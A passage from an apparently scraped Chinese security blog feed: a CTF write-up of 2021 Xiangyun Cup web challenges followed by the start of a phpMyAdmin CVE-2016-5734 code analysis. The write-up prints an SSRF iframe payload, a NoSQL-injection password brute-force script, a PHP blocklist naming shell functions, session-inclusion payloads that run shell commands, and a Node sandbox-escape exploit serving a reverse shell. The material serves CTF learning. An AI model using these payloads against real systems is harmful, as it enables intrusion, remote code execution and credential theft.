=&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) next(createError(<span class="number">500</span>));</span><br><span class="line">                <span class="keyword">const</span> checksum = <span class="keyword">await</span> getCheckSum(filename);</span><br><span class="line">                <span class="built_in">console</span>.log(checksum)</span><br><span class="line">                <span class="keyword">await</span> DB.Create(<span class="string">&#x27;superuser&#x27;</span>, filename, checksum)</span><br><span class="line">                <span class="keyword">return</span> res.render(<span class="string">&#x27;admin&#x27;</span>, &#123; <span class="attr">message</span> : <span class="string">`Your pdf is successfully saved 🤑 You know how to download it right?`</span>&#125;);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.render(<span class="string">&#x27;admin&#x27;</span>, &#123; <span class="attr">error</span> : <span class="string">&#x27;Failed to generate pdf 😥&#x27;</span>&#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/api/files&#x27;</span>, <span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.socket.remoteAddress.replace(<span class="regexp">/^.*:/</span>, <span class="string">&#x27;&#x27;</span>) != <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> next(createError(<span class="number">401</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> &#123; username , filename, checksum &#125; = req.query;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span>(username) == <span class="string">&quot;string&quot;</span> &amp;&amp; <span class="keyword">typeof</span>(filename) == <span class="string">&quot;string&quot;</span> &amp;&amp; <span class="keyword">typeof</span>(checksum) == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">await</span> DB.Create(username, filename, checksum)</span><br><span class="line">            <span class="keyword">return</span> res.send(<span class="string">&#x27;Done&#x27;</span>)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.send(<span class="string">&#x27;Error!&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> res.send(<span class="string">&#x27;Parameters error&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/api/files/:id&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> token = req.signedCookies[<span class="string">&#x27;token&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> (token &amp;&amp; token[<span class="string">&#x27;username&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (token.username == <span class="string">&#x27;superuser&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.send(<span class="string">&#x27;Superuser is disabled now&#x27;</span>);   </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> filename = <span class="keyword">await</span> DB.getFile(token.username, req.params.id)</span><br><span class="line">            <span class="keyword">if</span> (fs.existsSync(path.join(__dirname , <span class="string">&quot;../files/&quot;</span>, filename)))&#123;</span><br><span class="line">                <span class="keyword">return</span> res.send(<span class="keyword">await</span> readFile(path.join(__dirname , <span class="string">&quot;../files/&quot;</span>, filename)));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> res.send(<span class="string">&#x27;No such file!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.send(<span class="string">&#x27;Error!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> res.redirect(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>先看看这三个路由分别有什么用</p><p>/admin路由可以自己输入内容，然后用HTML转PDF渲染一个PDF出来，过滤严格，没发加上标签，而/api/files路由则必须本地访问，可以添加记录且所有参数都可控，最后/api/files/:id路由则通过checkSum来读文件。</p><p>第一个可以用数组绕过，从而可以使用[]绕过</p><p>接下来利用第二个路由进行ssrf</p><p>最后通过第三个路由读取</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">&quot;http://127.0.0.1:8888/api/files?username=admin&amp;filename=/flag&amp;checksum=任意&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><h1 id="PackageManager2021"><a href="#PackageManager2021" class="headerlink" title="PackageManager2021"></a>PackageManager2021</h1><p>index.ts里有个注入点</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> docs = <span class="keyword">await</span> User.$where(<span class="string">`this.username == &quot;admin&quot; &amp;&amp; hex_md5(this.password) == &quot;bfc31e7c22340f30e5b15badc0cafead&quot; || this.password[&#x27;+str(i)+&#x27;] == &quot;&#x27;+chr(x)+&#x27;&quot; &amp;&amp; this.username == &quot;admin&quot;`</span>).exec()</span><br></pre></td></tr></table></figure><p>害，还是太菜了，对nosql注入了解不多，一直在想怎么xss了，有空好好学习一下nosql注入（todo++</p><p>payload</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bfc31e7c22340f30e5b15badc0cafead<span class="string">&quot; || this.password[&#x27;+str(i)+&#x27;] == &quot;</span><span class="string">&#x27;+chr(x)+&#x27;</span><span class="string">&quot; &amp;&amp; this.username == &quot;</span>admin</span><br></pre></td></tr></table></figure><p>这样就可以一位位的拿到密码，拿到密码之后登录上去就可以看到flag了</p><p>来自<a href="https://cn-sec.com/archives/470638.html">https://cn-sec.com/archives/470638.html</a>的exp脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">passwd = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        burp0_url = <span class="string">&quot;http://47.104.108.80:8888/auth&quot;</span></span><br><span class="line">        burp0_cookies = &#123;<span class="string">&quot;session&quot;</span>: <span class="string">&quot;s%3A48cl_lUReimQytHn7toEfeafbGGIpWXB.YBzs%2B3EcrGrFNvfOoe0wEbmm2NSA%2B4tVAlsYy7eRoIE&quot;</span>&#125;</span><br><span class="line">        burp0_headers = &#123;<span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://47.104.108.80:8888&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://47.104.108.80:8888/auth&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">        burp0_data = &#123;<span class="string">&quot;_csrf&quot;</span>: <span class="string">&quot;kATaxQjv-Uka6Hw6X85iWgBuhyTxqgy7pvVA&quot;</span>, <span class="string">&quot;token&quot;</span>: <span class="string">&quot;cf87efe0c36a12aec113cd7982043573&quot;</span>||(this.username==<span class="string">&quot;admin&quot;</span>&amp;&amp;this.password[&#123;&#125;]==<span class="string">&quot;&#123;&#125;&quot;</span>)||<span class="string">&quot;&quot;</span>.<span class="built_in">format</span>(i,<span class="built_in">chr</span>(j))&#125;</span><br><span class="line">        res=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> res.status_code == <span class="number">302</span>:</span><br><span class="line">            passwd += <span class="built_in">chr</span>(j)</span><br><span class="line">            print(passwd)</span><br></pre></td></tr></table></figure><h1 id="安全检测"><a href="#安全检测" class="headerlink" title="安全检测"></a>安全检测</h1><p>后台可以填url，明显是ssrf，如果构造报错，那在返回中会有file_get_contents出现</p><p>第一反应肯定是试试伪协议，filter这些被过滤了</p><p>没啥思路，于是比赛时就到此为止了，赛后看wp才知道有个admin目录（又忘记扫目录了</p><p>里面有个include123.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$u</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&quot;\/\*|\*|\.\.\/|\.\/|load_file|outfile|dumpfile|sub|hex|where&quot;</span>;</span><br><span class="line"><span class="variable">$pattern</span> .= <span class="string">&quot;|file_put_content|file_get_content|fwrite|curl|system|eval|assert&quot;</span>;</span><br><span class="line"><span class="variable">$pattern</span> .=<span class="string">&quot;|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore&quot;</span>;</span><br><span class="line"><span class="variable">$pattern</span> .=<span class="string">&quot;|`|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec|http|.php|.ph|.log|\@|:\/\/|flag|access|error|stdout|stderr&quot;</span>;</span><br><span class="line"><span class="variable">$pattern</span> .=<span class="string">&quot;|file|dict|gopher&quot;</span>;</span><br><span class="line"><span class="comment">//累了累了，饮茶先</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$vpattern</span> = explode(<span class="string">&quot;|&quot;</span>,<span class="variable">$pattern</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$vpattern</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;    </span><br><span class="line">    <span class="keyword">if</span> (preg_match( <span class="string">&quot;/<span class="subst">$value</span>/i&quot;</span>, <span class="variable">$u</span> ))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;检测到恶意字符&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$u</span>);</span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在这个过滤下无法包含vps也无法通过日志</p><p>于是就只能试试session了</p><p>于是成功执行函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url1=http:<span class="comment">//127.0.0.1/admin/include123.php?u=/tmp/sess_aed2613cf894023354f4f332c67e9f2d%26fxz=<span class="meta">&lt;?=</span>phpinfo();<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>看目录下内容空格用%09</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url1=http:<span class="comment">//127.0.0.1/admin/include123.php?u=/tmp/sess_aed2613cf894023354f4f332c67e9f2d%26fxz=<span class="meta">&lt;?=</span>`ls%09/`;<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>flag被过滤了利用?或者*啥的过滤一下就可以了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url1=http:<span class="comment">//127.0.0.1/admin/include123.php?u=/tmp/sess_aed2613cf894023354f4f332c67e9f2d%26fxz=<span class="meta">&lt;?=</span>`.%09/getfl?g.sh`;<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h1 id="crawler-z"><a href="#crawler-z" class="headerlink" title="crawler_z"></a>crawler_z</h1><p>这题当时完全没思路，只能赛后看看大师傅们是怎么做的</p><p>主要功能在user.js</p><p>功能就是用户可以输入一个网址，然后通过验证爬虫就会去爬那个网址</p><p>实现爬虫功能的是一个叫zombie的库</p><p>然后参考<a href="https://ha.cker.in/index.php/Article/13563">https://ha.cker.in/index.php/Article/13563</a>来进行漏洞利用</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (url.protocol != <span class="string">&quot;http:&quot;</span> &amp;&amp; url.protocol != <span class="string">&quot;https:&quot;</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (url.href.includes(<span class="string">&#x27;oss-cn-beijing.ichunqiu.com&#x27;</span>) === <span class="literal">false</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><p>checkBucket函数下，看到bucket的要求，必须以http:或者https:为开头，且必须包含oss-cn-beijing.ichunqiu.com</p><p>然后还得过</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="regexp">/^https:\/\/[a-f0-9]&#123;32&#125;\.oss-cn-beijing\.ichunqiu\.com\/$/</span>.exec(bucket)) &#123;</span><br><span class="line">    res.redirect(<span class="string">`/user/verify?token=<span class="subst">$&#123;authToken&#125;</span>`</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是完整的verify路由</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">router.get(<span class="string">&#x27;/verify&#x27;</span>, <span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; token &#125; = req.query;</span><br><span class="line">    <span class="keyword">if</span> (!token || <span class="keyword">typeof</span> (token) !== <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.send(<span class="string">&quot;Parameters error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> user = <span class="keyword">await</span> User.findByPk(req.session.userId);</span><br><span class="line">    <span class="keyword">const</span> result = <span class="keyword">await</span> Token.findOne(&#123;</span><br><span class="line">        token,</span><br><span class="line">        userId: req.session.userId,</span><br><span class="line">        valid: <span class="literal">true</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">if</span> (result) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">await</span> Token.update(&#123;</span><br><span class="line">                valid: <span class="literal">false</span></span><br><span class="line">            &#125;, &#123;</span><br><span class="line">                where: &#123; <span class="attr">userId</span>: req.session.userId &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">await</span> User.update(&#123;</span><br><span class="line">                bucket: user.personalBucket</span><br><span class="line">            &#125;, &#123;</span><br><span class="line">                where: &#123; <span class="attr">userId</span>: req.session.userId &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            user = <span class="keyword">await</span> User.findByPk(req.session.userId);</span><br><span class="line">            <span class="keyword">return</span> res.render(<span class="string">&#x27;user&#x27;</span>, &#123; user, <span class="attr">message</span>: <span class="string">&quot;Successfully update your bucket from personal bucket!&quot;</span> &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            next(createError(<span class="number">500</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        user = <span class="keyword">await</span> User.findByPk(req.session.userId);</span><br><span class="line">        <span class="keyword">return</span> res.render(<span class="string">&#x27;user&#x27;</span>, &#123; user, <span class="attr">message</span>: <span class="string">&quot;Failed to update, check your token carefully&quot;</span> &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>大概意思是输入一个正确的token，就会把用户的personalBucket放到bucket里面，就可以让爬虫去访问了</p><p>思路为把bucket设置为我们自己的vps</p><p>然后在我们的vps上放置一个oss-cn-beijing.ichunqiu.com.html恶意文件</p><p>修改bucket为<a href="http://ip/oss-cn-beijing.ichunqiu.com.html">http://ip/oss-cn-beijing.ichunqiu.com.html</a></p><p>最后通过而已文件来反弹shell</p><p>exp</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> codeToExec = <span class="string">&quot;var sync=require(&#x27;child_process&#x27;).spawnSync; &quot;</span> +</span><br><span class="line">    <span class="string">&quot;var ls = sync(&#x27;bash&#x27;, [&#x27;-c&#x27;, &#x27;bash -i .......&#x27;]); console.log(ls.output.toString());&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> exploit = <span class="string">&quot;c=&#x27;constructor&#x27;;require=this[c][c](&#x27;return process&#x27;)().mainModule.require;&quot;</span> + codeToExec;</span><br><span class="line"><span class="keyword">var</span> attackVector = <span class="string">&quot;c=&#x27;constructor&#x27;;this[c][c](\&quot;&quot;</span> + exploit + <span class="string">&quot;\&quot;)()&quot;</span>;</span><br><span class="line"><span class="comment">// end exploit</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/test&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.send(<span class="string">&quot;&lt;script&gt;&quot;</span> + attackVector + <span class="string">&quot;&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure><p>还有一道是java的，因为不会java，java水平停留在应付考试（太菜了），所以先摆烂了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2021祥云杯-web-wp&quot;&gt;&lt;a href=&quot;#2021祥云杯-web-wp&quot; class=&quot;headerlink&quot; title=&quot;2021祥云杯_web_wp&quot;&gt;&lt;/a&gt;2021祥云杯_web_wp&lt;/h1&gt;&lt;p&gt;比赛的wp以及赛后复现，这次比赛总的赛题也更</summary>
      
    
    
    
    <category term="ctf" scheme="http://www.fxizenta.design/categories/ctf/"/>
    
    <category term="web" scheme="http://www.fxizenta.design/categories/ctf/web/"/>
    
    
    <category term="wp" scheme="http://www.fxizenta.design/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>phpmyadmin的几个漏洞复现</title>
    <link href="http://www.fxizenta.design/2021/08/13/phpmyadmin/"/>
    <id>http://www.fxizenta.design/2021/08/13/phpmyadmin/</id>
    <published>2021-08-13T15:26:54.000Z</published>
    <updated>2021-08-13T15:50:23.926Z</updated>
    
    <content type="html"><![CDATA[<h1 id="phpmyadmin的几个漏洞复现"><a href="#phpmyadmin的几个漏洞复现" class="headerlink" title="phpmyadmin的几个漏洞复现"></a>phpmyadmin的几个漏洞复现</h1><p>phpMyAdmin 是众多 MySQL图形化管理工具中使用最为广泛的一种，是一款使用PHP 开发的基于B/S模式的 MySQL 客户端软件</p><p>phpMyAdmin 为Web 开发人员提供了类似 Access，SQL Server 的图形化数据库操作界面，通过该管理工具可以对 MySQL 进行各种操作，如何创建数据库，数据表和生成 MySQL 数据库脚本文件等。</p><h1 id="CVE-2016-5734-Phpmyadmin后台代码执行漏洞"><a href="#CVE-2016-5734-Phpmyadmin后台代码执行漏洞" class="headerlink" title="CVE-2016-5734 Phpmyadmin后台代码执行漏洞"></a>CVE-2016-5734 Phpmyadmin后台代码执行漏洞</h1><p>主要是利用在php 5.4.7之前的版本中preg_replace函数对空字节的错误处理Bug，使注入的代码可远程执行.</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a><strong>影响版本</strong></h2><ul><li>4.6.x 版本（直至 4.6.3）</li><li>4.4.x 版本（直至 4.4.15.7）</li><li>4.0.x 版本（直至 4.0.10.16）</li><li>php版本： 4.3.0 ~5.4.6</li></ul><p>php5.0以上将/e模式废弃了</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>preg_replace() 函数有个被弃用的修饰符\e，如果设置这个修饰符，preg_replace() 在进行了对替换字符串的替换之后, 将替换后的字符串作为php 代码进行执行，并使用执行结果 作为实际参与替换的字符串。</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace ( mixed <span class="variable">$pattern</span> , mixed <span class="variable">$replacement</span> , mixed <span class="variable">$subject</span> [, <span class="keyword">int</span> <span class="variable">$limit</span> = <span class="number">-1</span> [, <span class="keyword">int</span> &amp;<span class="variable">$count</span> ]] )</span><br></pre></td></tr></table></figure><p>搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。</p><p>参数说明：</p><ul><li>$pattern: 要搜索的模式，可以是字符串或一个字符串数组。</li><li>$replacement: 用于替换的字符串或字符串数组。</li><li>$subject: 要搜索替换的目标字符串或字符串数组。</li><li>$limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。</li><li>$count: 可选，为替换执行的次数</li></ul><h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a><strong>返回值</strong></h3><p>如果 subject 是一个数组， preg_replace() 返回一个数组， 其他情况下返回一个字符串。</p><p>如果匹配被查找到，替换后的 subject 被返回，其他情况下 返回没有改变的 subject。如果发生错误，返回 NULL。</p><h2 id="漏洞利用前提"><a href="#漏洞利用前提" class="headerlink" title="漏洞利用前提"></a>漏洞利用前提</h2><ol><li>知道phpMyAdmin的路径，并且可以使用账号密码登录成功</li><li>知道对应db的table，或者在db中有创建table的权限</li></ol><h2 id="漏洞利用点"><a href="#漏洞利用点" class="headerlink" title="漏洞利用点"></a>漏洞利用点</h2><p>本漏洞利用的是在/libraries/TableSearch.class.php中的preg_replace函数</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled.png" alt="phpmyadmin%E7%9A%84%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20830a78be83a34810b86061b7eada5da0/Untitled.png"></p><p><code>preg_replace</code>在<code>_getRegexReplaceRows</code>中被使用，而<code>_getRegexReplaceRows</code>则是被调用于<code>getReplacePreview</code>,可以看到<code>preg_replace</code>调用了三个参数分别是<code>find</code>,<code>replaceWith</code>,<code>row[0]</code>,接下来要对这三个参数进行溯源</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%201.png" alt="phpmyadmin%E7%9A%84%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20830a78be83a34810b86061b7eada5da0/Untitled%201.png"></p><p>并且参数<code>find</code>与参数<code>replacement</code>都是经过该方法所传递的,</p><p>接着溯源发现<code>getReplacePreview</code>在 <code>tbl_find_replace.php</code>中被使用，同时 <code>find</code> 与 <code>replaceWith</code>参数经POST方法进行传递</p><p>而<code>tbl_find_replace.php</code>提供的查找并替换数据表的功能/该功能时针对某一数据库中的数据表进行的查询功能</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%202.png" alt="phpmyadmin%E7%9A%84%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20830a78be83a34810b86061b7eada5da0/Untitled%202.png"></p><p>其中查找对应<code>find</code>，替换为对应<code>replaceWith</code>，于是前两个参数都发现是可控的，接下来就差row[0]这个参数了</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%203.png" alt="phpmyadmin%E7%9A%84%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20830a78be83a34810b86061b7eada5da0/Untitled%203.png"></p><p>可以看到<code>row</code>来自<code>result</code></p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%204.png" alt="phpmyadmin%E7%9A%84%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20830a78be83a34810b86061b7eada5da0/Untitled%204.png"></p><p><code>result</code>来自<code>Sql_query</code></p><p>接着跟sql_query</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%205.png" alt="phpmyadmin%E7%9A%84%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20830a78be83a34810b86061b7eada5da0/Untitled%205.png"></p><p>sql语句大概整理如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> $columnname ,<span class="number">1</span>,cont(<span class="operator">*</span>) </span><br><span class="line"><span class="keyword">FROM</span> database.table_name </span><br><span class="line"><span class="keyword">WHERE</span> $columnname RLIKE ‘$find’ </span><br><span class="line"><span class="keyword">COLLATE</span> $charset_bin </span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> $columnname </span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> $<span class="keyword">column</span> <span class="keyword">ASC</span>;</span><br></pre></td></tr></table></figure><p>并将这个查询后的值作为键值对的第一个值给了 <code>preg_replace</code>函数的作为第三个参数。</p><p><code>PMA_TableSearch</code>类的构造方法</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%206.png" alt="phpmyadmin%E7%9A%84%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20830a78be83a34810b86061b7eada5da0/Untitled%206.png"></p><p>在<code>tbl_find_replace.php</code>使用了这个类</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%207.png" alt="phpmyadmin%E7%9A%84%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20830a78be83a34810b86061b7eada5da0/Untitled%207.png"></p><p>接下来回溯<code>db</code>和<code>table</code>两个参数</p><p>发现在 <code>/libraries/common.inc.php</code> 中有定义</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%208.png" 